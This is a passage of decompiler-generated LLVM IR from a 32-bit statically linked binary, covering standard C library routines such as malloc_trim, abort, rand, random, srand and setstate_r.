  %v0_8054128 = load i32, i32* @global_var_806188c.495, align 4
  store i32 %v0_8054128, i32* %eax.global-to-local, align 4
  %v1_805412d = add i32 %v0_8054128, 4
  %v2_805412d = inttoptr i32 %v1_805412d to i32*
  %v3_805412d = load i32, i32* %v2_805412d, align 4
  %v1_8054130 = and i32 %v3_805412d, -4
  store i32 %v1_8054130, i32* %eax.global-to-local, align 4
  %v1_8054133 = load i32, i32* @global_var_8061ba4.511, align 4
  %v7_8054133 = icmp ult i32 %v1_8054130, %v1_8054133
  br i1 %v7_8054133, label %dec_label_pc_805416c, label %dec_label_pc_805413b

dec_label_pc_805413b:                             ; preds = %dec_label_pc_8054128
  %v0_805413b = load i32, i32* @global_var_8061ba8.509, align 8
  store i32 %v0_805413b, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* @edx, align 4
  %v0_8054145 = call i32 @__malloc_trim()
  store i32 %v0_8054145, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805416c

dec_label_pc_805414c:                             ; preds = %dec_label_pc_8054054
  %v2_805414c = inttoptr i32 %v1_805401d to i32*
  %v3_805414c = load i32, i32* %v2_805414c, align 4
  %v0_805414f = load i32, i32* @global_var_8061bb0.502, align 16
  %v1_805414f = add i32 %v0_805414f, -1
  store i32 %v1_805414f, i32* @global_var_8061bb0.502, align 16
  %v2_8054155 = add i32 %v3_805414c, %v1_805402d
  store i32 %v2_8054155, i32* %eax.global-to-local, align 4
  %v2_8054158 = sub i32 %v1_805401d, %v3_805414c
  %v0_805415e = load i32, i32* @global_var_8061bc4.506, align 4
  %v2_805415e = sub i32 %v0_805415e, %v2_8054155
  store i32 %v2_805415e, i32* @global_var_8061bc4.506, align 4
  %v4_8054164 = call i32 @munmap(i32 %v2_8054158, i32 %v2_8054155, i32 %v1_805402d, i32 %v1_805402d)
  store i32 %v4_8054164, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805416c

dec_label_pc_805416c:                             ; preds = %dec_label_pc_8054128, %dec_label_pc_8054107, %dec_label_pc_805413b, %dec_label_pc_8054034, %dec_label_pc_805414c
  store i32 %v2_8054007, i32* @eax, align 4
  %v2_8054175 = call i32 @__pthread_return_void(i32 %v2_8054007, i32 1)
  store i32 %v2_8054175, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805417d

dec_label_pc_805417d:                             ; preds = %entry, %dec_label_pc_805416c
  %.0 = phi i32 [ undef, %entry ], [ %v2_8054175, %dec_label_pc_805416c ]
  store i32 %v0_8053fec, i32* @ebx, align 4
  store i32 %v0_8053feb, i32* @esi, align 4
  store i32 %v0_8053fea, i32* @edi, align 4
  store i32 %v0_8053fe9, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_805414c, { 1, 0 }
  uselistorder i32 %v0_80540de, { 1, 0 }
  uselistorder i32 %v1_80540ac, { 1, 0 }
  uselistorder i32 %v2_80540a5, { 1, 0 }
  uselistorder i32 %v1_805409a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80540a9, { 1, 0 }
  uselistorder i32 %v1_805402d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8054025, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805401d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 undef, { 1, 0 }
  uselistorder i32* bitcast (i8* @global_var_8061860.494 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8061894.497 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_806188c.495, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_805b3f0.493 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_805417d, { 1, 0 }
  uselistorder label %dec_label_pc_805416c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8054128, { 1, 0 }
  uselistorder label %dec_label_pc_8054107, { 1, 0 }
  uselistorder label %dec_label_pc_80540d2, { 1, 0 }
  uselistorder label %dec_label_pc_80540ca, { 1, 0 }
  uselistorder label %dec_label_pc_8054096, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8054185 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8054192 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8061860.494 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* @edx, align 4
  %v0_805419f = load i32, i32* @ebx, align 4
  store i32 %v0_805419f, i32* @eax, align 4
  store i32 %v0_8054185, i32* @ebx, align 4
  %v0_80541a2 = call i32 @__malloc_trim()
  ret i32 %v0_80541a2

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8061860.494 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8061860.494, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_80541b4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b408.514 to i32))
  %v12_80541be = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80541c3

dec_label_pc_80541c3:                             ; preds = %dec_label_pc_80541c3.dec_label_pc_80541c3_crit_edge, %entry
  %v0_80541c3 = phi i32 [ %v12_80541be, %entry ], [ %v0_80541c3.pre, %dec_label_pc_80541c3.dec_label_pc_80541c3_crit_edge ]
  %v1_80541ce19 = phi i32 [ 31, %entry ], [ %v1_80541ce, %dec_label_pc_80541c3.dec_label_pc_80541c3_crit_edge ]
  %v2_80541c3 = mul i32 %v1_80541ce19, 4
  %v3_80541c3 = add i32 %v2_80541c3, 152
  %v4_80541c3 = add i32 %v3_80541c3, %v0_80541c3
  %v5_80541c3 = inttoptr i32 %v4_80541c3 to i32*
  store i32 0, i32* %v5_80541c3, align 4
  %v0_80541ce.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80541ce = add i32 %v0_80541ce.pre, -1
  %v9_80541ce = icmp slt i32 %v1_80541ce, 0
  store i32 %v1_80541ce, i32* %eax.global-to-local, align 4
  %v1_80541cf = icmp eq i1 %v9_80541ce, false
  br i1 %v1_80541cf, label %dec_label_pc_80541c3.dec_label_pc_80541c3_crit_edge, label %dec_label_pc_80541d1

dec_label_pc_80541c3.dec_label_pc_80541c3_crit_edge: ; preds = %dec_label_pc_80541c3
  %v0_80541c3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80541c3

dec_label_pc_80541d1:                             ; preds = %dec_label_pc_80541c3
  %v0_80541d1 = load i32, i32* @ebx, align 4
  %v2_80541d5 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80541d5, i32* @ebx, align 4
  %v4_80541dd = call i32 @__sigaddset(i32 %v2_80541d5, i32 6, i32 %v0_80541d1, i32 %v0_80541d1)
  store i32 %v4_80541dd, i32* %eax.global-to-local, align 4
  %v1_80541e5 = icmp eq i32 %v4_80541dd, 0
  %v1_80541e7 = icmp eq i1 %v1_80541e5, false
  br i1 %v1_80541e7, label %dec_label_pc_80541f7, label %dec_label_pc_80541e9

dec_label_pc_80541e9:                             ; preds = %dec_label_pc_80541d1
  %v3_80541ef = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_80541ef = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_80541ef, i32 0)
  store i32 %v4_80541ef, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80541f7

dec_label_pc_80541f7:                             ; preds = %dec_label_pc_80541d1, %dec_label_pc_80541e9
  %v2_805422f4 = phi i32 [ %v4_80541dd, %dec_label_pc_80541d1 ], [ %v4_80541ef, %dec_label_pc_80541e9 ]
  %v0_80541f7 = load i8, i8* @global_var_8061780.515, align 128
  %v1_80541f7 = icmp eq i8 %v0_80541f7, 0
  %v1_80541fe = icmp eq i1 %v1_80541f7, false
  br i1 %v1_80541fe, label %dec_label_pc_805422f, label %dec_label_pc_8054200

dec_label_pc_8054200:                             ; preds = %dec_label_pc_80541f7
  store i8 1, i8* @global_var_8061780.515, align 128
  br label %dec_label_pc_8054207

dec_label_pc_8054207:                             ; preds = %dec_label_pc_805426e, %dec_label_pc_8054200
  %v1_805420f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b408.514 to i32))
  store i32 %v1_805420f, i32* %eax.global-to-local, align 4
  %v1_805421b = call i32 @__raise(i32 6)
  store i32 %v1_805421b, i32* %eax.global-to-local, align 4
  %v1_8054227 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b408.514 to i32))
  store i32 %v1_8054227, i32* %eax.global-to-local, align 4
  %v0_805422f.pre = load i8, i8* @global_var_8061780.515, align 128
  br label %dec_label_pc_805422f

dec_label_pc_805422f:                             ; preds = %dec_label_pc_80541f7, %dec_label_pc_8054207
  %v2_805422f = phi i32 [ %v2_805422f4, %dec_label_pc_80541f7 ], [ %v1_8054227, %dec_label_pc_8054207 ]
  %v0_805422f = phi i8 [ %v0_80541f7, %dec_label_pc_80541f7 ], [ %v0_805422f.pre, %dec_label_pc_8054207 ]
  %v1_805422f = zext i8 %v0_805422f to i32
  %v3_805422f = and i32 %v2_805422f, -256
  %v4_805422f = or i32 %v1_805422f, %v3_805422f
  store i32 %v4_805422f, i32* %eax.global-to-local, align 4
  %v10_8054234 = icmp eq i8 %v0_805422f, 1
  %v1_8054236 = icmp eq i1 %v10_8054234, false
  br i1 %v1_8054236, label %dec_label_pc_8054290, label %dec_label_pc_8054238

dec_label_pc_8054238:                             ; preds = %dec_label_pc_805422f
  %v2_8054240 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8054240, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8061780.515, align 128
  %v3_805424c = bitcast i32* %stack_var_-272 to i8*
  %v4_805424c = call i32 @__GI_memset(i8* %v3_805424c, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054263

dec_label_pc_8054263:                             ; preds = %dec_label_pc_8054263.dec_label_pc_8054263_crit_edge, %dec_label_pc_8054238
  %v0_8054263 = phi i32 [ %v12_80541be, %dec_label_pc_8054238 ], [ %v0_8054263.pre, %dec_label_pc_8054263.dec_label_pc_8054263_crit_edge ]
  %v1_805426b18 = phi i32 [ 31, %dec_label_pc_8054238 ], [ %v1_805426b, %dec_label_pc_8054263.dec_label_pc_8054263_crit_edge ]
  %v2_8054263 = mul i32 %v1_805426b18, 4
  %v3_8054263 = add i32 %v2_8054263, 16
  %v4_8054263 = add i32 %v3_8054263, %v0_8054263
  %v5_8054263 = inttoptr i32 %v4_8054263 to i32*
  store i32 -1, i32* %v5_8054263, align 4
  %v0_805426b.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_805426b = add i32 %v0_805426b.pre, -1
  %v9_805426b = icmp slt i32 %v1_805426b, 0
  store i32 %v1_805426b, i32* %eax.global-to-local, align 4
  %v1_805426c = icmp eq i1 %v9_805426b, false
  br i1 %v1_805426c, label %dec_label_pc_8054263.dec_label_pc_8054263_crit_edge, label %dec_label_pc_805426e

dec_label_pc_8054263.dec_label_pc_8054263_crit_edge: ; preds = %dec_label_pc_8054263
  %v0_8054263.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054263

dec_label_pc_805426e:                             ; preds = %dec_label_pc_8054263
  store i32 %v2_8054240, i32* %eax.global-to-local, align 4
  %v4_8054283 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8054283, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054207

dec_label_pc_8054290:                             ; preds = %dec_label_pc_805422f
  %v10_8054290 = icmp eq i8 %v0_805422f, 2
  %v1_8054292 = icmp eq i1 %v10_8054290, false
  br i1 %v1_8054292, label %dec_label_pc_805429c, label %dec_label_pc_8054294

dec_label_pc_8054294:                             ; preds = %dec_label_pc_8054290
  store i8 3, i8* @global_var_8061780.515, align 128
  br label %dec_label_pc_805429c

dec_label_pc_805429c:                             ; preds = %dec_label_pc_8054290, %dec_label_pc_8054294
  %v0_805429c = phi i8 [ %v0_805422f, %dec_label_pc_8054290 ], [ 3, %dec_label_pc_8054294 ]
  %v9_805429c = icmp eq i8 %v0_805429c, 3
  %v1_80542a3 = icmp eq i1 %v9_805429c, false
  br i1 %v1_80542a3, label %dec_label_pc_80542b6, label %dec_label_pc_80542a5

dec_label_pc_80542a5:                             ; preds = %dec_label_pc_805429c
  store i8 4, i8* @global_var_8061780.515, align 128
  %v1_80542b1 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_80542b6:                             ; preds = %dec_label_pc_805429c, %dec_label_pc_80542b6
  br label %dec_label_pc_80542b6

; uselistorder directives
  uselistorder i32 %v1_805426b, { 2, 1, 0 }
  uselistorder i8 %v0_805422f, { 2, 0, 1, 3 }
  uselistorder i32 %v1_80541ce, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8 3, { 0, 2, 4, 3, 1 }
  uselistorder i8* @global_var_8061780.515, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80542b6, { 1, 0 }
  uselistorder label %dec_label_pc_805429c, { 1, 0 }
  uselistorder label %dec_label_pc_805422f, { 1, 0 }
  uselistorder label %dec_label_pc_80541f7, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_80542bc = call i32 @random()
  ret i32 %v0_80542bc

; uselistorder directives
  uselistorder i32 ()* @random, { 9, 4, 3, 0, 5, 2, 1, 8, 7, 6 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80542c4 = load i32, i32* @ebx, align 4
  store i32 %v0_80542c4, i32* %stack_var_-4, align 4
  %v2_80542d2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80542d2, i32* @ebx, align 4
  %v2_80542d7 = call i32 @__pthread_return_void(i32 %v2_80542d2, i32 134565087)
  %v1_80542e3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b420.516 to i32))
  %v2_80542ea = ptrtoint i32* %stack_var_-8 to i32
  %v3_80542f4 = call i32 @__GI_random_r(i32* nonnull @global_var_805b438, i32 %v2_80542ea)
  store i32 ptrtoint (i32* @global_var_805b438 to i32), i32* @eax, align 4
  %v2_80542fe = call i32 @__pthread_return_void(i32 %v2_80542d2, i32 1)
  %v3_8054303 = load i32, i32* %stack_var_-8, align 4
  %v2_805430a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805430a, i32* @ebx, align 4
  ret i32 %v3_8054303
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_805431d = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805431d, i32* @eax, align 4
  %v2_8054322 = call i32 @__pthread_return_void(i32 %v2_805431d, i32 134565087)
  %v1_805432e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b420.516 to i32))
  %v0_8054333 = load i32, i32* bitcast (i32** @global_var_805b440.519 to i32*), align 64
  store i32 %v0_8054333, i32* @ebx, align 4
  %v3_8054344 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805b438)
  %v2_805434c = icmp slt i32 %v3_8054344, 0
  br i1 %v2_805434c, label %dec_label_pc_8054353, label %dec_label_pc_8054350

dec_label_pc_8054350:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805b43c.520 to i32), i32* @esi, align 4
  br label %dec_label_pc_8054353

dec_label_pc_8054353:                             ; preds = %entry, %dec_label_pc_8054350
  store i32 %v2_805431d, i32* @eax, align 4
  %v2_805435c = call i32 @__pthread_return_void(i32 %v2_805431d, i32 1)
  %v0_8054364 = load i32, i32* @esi, align 4
  ret i32 %v0_8054364

; uselistorder directives
  uselistorder label %dec_label_pc_8054353, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8054378 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054378, i32* @ebx, align 4
  %v2_805437d = call i32 @__pthread_return_void(i32 %v2_8054378, i32 134565087)
  %v1_8054389 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b420.516 to i32))
  store i32 ptrtoint (i32** @global_var_805b43c.520 to i32), i32* @esi, align 4
  %v4_80543a8 = inttoptr i32 %arg2 to i32*
  %v5_80543a8 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_80543a8, i32 %arg3, i32 ptrtoint (i32* @global_var_805b438 to i32))
  store i32 %v5_80543a8, i32* @eax, align 4
  %v2_80543b3 = call i32 @__pthread_return_void(i32 %v2_8054378, i32 1)
  %v0_80543bb = load i32, i32* @esi, align 4
  ret i32 %v0_80543bb
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80543c0 = load i32, i32* @ebx, align 4
  store i32 %v0_80543c0, i32* %stack_var_-4, align 4
  %v2_80543ce = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80543ce, i32* @ebx, align 4
  %v2_80543d3 = call i32 @__pthread_return_void(i32 %v2_80543ce, i32 134565087)
  %v1_80543df = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b420.516 to i32))
  %v3_80543ef = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_805b438)
  store i32 ptrtoint (i32* @global_var_805b438 to i32), i32* @eax, align 4
  %v2_80543f9 = call i32 @__pthread_return_void(i32 %v2_80543ce, i32 1)
  %v2_8054401 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054401, i32* @ebx, align 4
  ret i32 %v2_80543f9

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_805b438 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_805b438, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_8054407 = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_8054413 = add i32 %tmp3, 12
  %v2_8054413 = inttoptr i32 %v1_8054413 to i32*
  %v3_8054413 = load i32, i32* %v2_8054413, align 4
  store i32 %v3_8054413, i32* %ecx.global-to-local, align 4
  %v1_8054416 = add i32 %arg1, 4
  store i32 %v1_8054416, i32* %esi.global-to-local, align 4
  %v1_8054419 = add i32 %tmp3, 8
  %v2_8054419 = inttoptr i32 %v1_8054419 to i32*
  %v3_8054419 = load i32, i32* %v2_8054419, align 4
  %v1_805441c = icmp eq i32 %v3_8054413, 0
  %v1_805441e = icmp eq i1 %v1_805441c, false
  br i1 %v1_805441e, label %dec_label_pc_8054429, label %dec_label_pc_8054420

dec_label_pc_8054420:                             ; preds = %entry
  %v1_8054420 = add i32 %v3_8054419, -4
  %v2_8054420 = inttoptr i32 %v1_8054420 to i32*
  store i32 0, i32* %v2_8054420, align 4
  br label %dec_label_pc_8054439

dec_label_pc_8054429:                             ; preds = %entry
  %v1_8054429 = add i32 %tmp3, 4
  %v2_8054429 = inttoptr i32 %v1_8054429 to i32*
  %v3_8054429 = load i32, i32* %v2_8054429, align 4
  %v2_805442c = sub i32 %v3_8054429, %v3_8054419
  %v2_805442e = sdiv i32 %v2_805442c, 4
  %v3_8054431 = mul i32 %v2_805442e, 5
  %v2_8054434 = add i32 %v3_8054431, %v3_8054413
  store i32 %v2_8054434, i32* %eax.global-to-local, align 4
  %v2_8054436 = add i32 %v3_8054419, -4
  %v3_8054436 = inttoptr i32 %v2_8054436 to i32*
  store i32 %v2_8054434, i32* %v3_8054436, align 4
  br label %dec_label_pc_8054439

dec_label_pc_8054439:                             ; preds = %dec_label_pc_8054420, %dec_label_pc_8054429
  %v0_8054439 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054439 = add i32 %v0_8054439, -4
  %v2_8054439 = inttoptr i32 %v1_8054439 to i32*
  %v3_8054439 = load i32, i32* %v2_8054439, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8054441 = ashr i32 %v3_8054439, 31
  %v2_8054442 = zext i32 %v3_8054439 to i64
  %v4_8054442 = zext i32 %v1_8054441 to i64
  %v5_8054442 = mul nuw i64 %v4_8054442, 4294967296
  %v6_8054442 = or i64 %v5_8054442, %v2_8054442
  %v8_8054442 = sdiv i64 %v6_8054442, 5
  %v9_8054442 = trunc i64 %v8_8054442 to i32
  store i32 %v9_8054442, i32* %eax.global-to-local, align 4
  %v10_8054442 = srem i64 %v6_8054442, 5
  %v11_8054442 = trunc i64 %v10_8054442 to i32
  %v6_8054447 = icmp ugt i32 %v11_8054442, 4
  br i1 %v6_8054447, label %dec_label_pc_8054487, label %dec_label_pc_8054449

dec_label_pc_8054449:                             ; preds = %dec_label_pc_8054439
  %v1_8054449 = mul i32 %v11_8054442, 4
  %v2_8054449 = add i32 %v1_8054449, ptrtoint (i32* @global_var_805a8f4.521 to i32)
  %v3_8054449 = inttoptr i32 %v2_8054449 to i32*
  %v4_8054449 = load i32, i32* %v3_8054449, align 4
  store i32 %v4_8054449, i32* %ecx.global-to-local, align 4
  %v1_8054450 = icmp eq i32 %v11_8054442, 0
  %v2_8054452 = add i32 %v1_8054449, ptrtoint (i32* @global_var_805a8e0.522 to i32)
  %v3_8054452 = inttoptr i32 %v2_8054452 to i32*
  %v4_8054452 = load i32, i32* %v3_8054452, align 4
  store i32 %v4_8054452, i32* %ebp.global-to-local, align 4
  %v1_8054459 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054459 = add i32 %v1_8054459, 12
  %v3_8054459 = inttoptr i32 %v2_8054459 to i32*
  store i32 %v11_8054442, i32* %v3_8054459, align 4
  %v0_805445c = load i32, i32* %ecx.global-to-local, align 4
  %v1_805445c = load i32, i32* %ebx.global-to-local, align 4
  %v2_805445c = add i32 %v1_805445c, 16
  %v3_805445c = inttoptr i32 %v2_805445c to i32*
  store i32 %v0_805445c, i32* %v3_805445c, align 4
  %v0_805445f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805445f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805445f = add i32 %v1_805445f, 20
  %v3_805445f = inttoptr i32 %v2_805445f to i32*
  store i32 %v0_805445f, i32* %v3_805445f, align 4
  br i1 %v1_8054450, label %dec_label_pc_805447a, label %dec_label_pc_8054464

dec_label_pc_8054464:                             ; preds = %dec_label_pc_8054449
  %v0_8054464 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054464 = add i32 %v0_8054464, -4
  %v2_8054464 = inttoptr i32 %v1_8054464 to i32*
  %v3_8054464 = load i32, i32* %v2_8054464, align 4
  %v1_8054467 = ashr i32 %v3_8054464, 31
  %v0_8054468 = load i32, i32* %edi.global-to-local, align 4
  %v2_8054468 = zext i32 %v3_8054464 to i64
  %v4_8054468 = zext i32 %v1_8054467 to i64
  %v5_8054468 = mul nuw i64 %v4_8054468, 4294967296
  %v6_8054468 = or i64 %v5_8054468, %v2_8054468
  %v7_8054468 = zext i32 %v0_8054468 to i64
  %v8_8054468 = sdiv i64 %v6_8054468, %v7_8054468
  %v9_8054468 = trunc i64 %v8_8054468 to i32
  %v2_805446a = mul i32 %v9_8054468, 4
  %v3_805446a = add i32 %v2_805446a, %v0_8054464
  %v1_805446d = load i32, i32* %ebp.global-to-local, align 4
  %v2_805446d = add i32 %v1_805446d, %v9_8054468
  store i32 %v2_805446d, i32* %eax.global-to-local, align 4
  %v1_805446f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805446f = add i32 %v1_805446f, 4
  %v3_805446f = inttoptr i32 %v2_805446f to i32*
  store i32 %v3_805446a, i32* %v3_805446f, align 4
  %v0_8054472 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054472 = ashr i32 %v0_8054472, 31
  %v0_8054473 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054473 = zext i32 %v0_8054472 to i64
  %v4_8054473 = zext i32 %v1_8054472 to i64
  %v5_8054473 = mul nuw i64 %v4_8054473, 4294967296
  %v6_8054473 = or i64 %v5_8054473, %v2_8054473
  %v7_8054473 = zext i32 %v0_8054473 to i64
  %v8_8054473 = sdiv i64 %v6_8054473, %v7_8054473
  %v9_8054473 = trunc i64 %v8_8054473 to i32
  store i32 %v9_8054473, i32* %eax.global-to-local, align 4
  %v10_8054473 = srem i64 %v6_8054473, %v7_8054473
  %v11_8054473 = trunc i64 %v10_8054473 to i32
  %v0_8054475 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054475 = mul i32 %v11_8054473, 4
  %v3_8054475 = add i32 %v2_8054475, %v0_8054475
  %v1_8054478 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054478 = inttoptr i32 %v1_8054478 to i32*
  store i32 %v3_8054475, i32* %v2_8054478, align 4
  br label %dec_label_pc_805447a

dec_label_pc_805447a:                             ; preds = %dec_label_pc_8054449, %dec_label_pc_8054464
  %v0_805447a = load i32, i32* %esi.global-to-local, align 4
  %v1_805447a = load i32, i32* %ecx.global-to-local, align 4
  %v2_805447a = mul i32 %v1_805447a, 4
  %v3_805447a = add i32 %v2_805447a, %v0_805447a
  %v1_805447d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805447d = add i32 %v1_805447d, 24
  %v3_805447d = inttoptr i32 %v2_805447d to i32*
  store i32 %v3_805447a, i32* %v3_805447d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8054482 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054482 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054482 = add i32 %v1_8054482, 8
  %v3_8054482 = inttoptr i32 %v2_8054482 to i32*
  store i32 %v0_8054482, i32* %v3_8054482, align 4
  %v0_805449c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054495

dec_label_pc_8054487:                             ; preds = %dec_label_pc_8054439
  %v1_8054487 = call i32 @__errno_location(i32 %v0_8054407)
  %v1_805448c = inttoptr i32 %v1_8054487 to i32*
  store i32 22, i32* %v1_805448c, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054495

dec_label_pc_8054495:                             ; preds = %dec_label_pc_805447a, %dec_label_pc_8054487
  %v0_805449c = phi i32 [ %v0_805449c.pre, %dec_label_pc_805447a ], [ -1, %dec_label_pc_8054487 ]
  store i32 %v0_8054407, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805449c

; uselistorder directives
  uselistorder i32 %v11_8054442, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054495, { 1, 0 }
  uselistorder label %dec_label_pc_805447a, { 1, 0 }
  uselistorder label %dec_label_pc_8054439, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_80544a0 = load i32, i32* @ebx, align 4
  store i32 %v0_80544a0, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_80544a9 = add i32 %tmp3, 12
  %v2_80544a9 = inttoptr i32 %v1_80544a9 to i32*
  %v3_80544a9 = load i32, i32* %v2_80544a9, align 4
  %v4_80544a9 = icmp eq i32 %v3_80544a9, 0
  %v1_80544ad = add i32 %tmp3, 8
  %v2_80544ad = inttoptr i32 %v1_80544ad to i32*
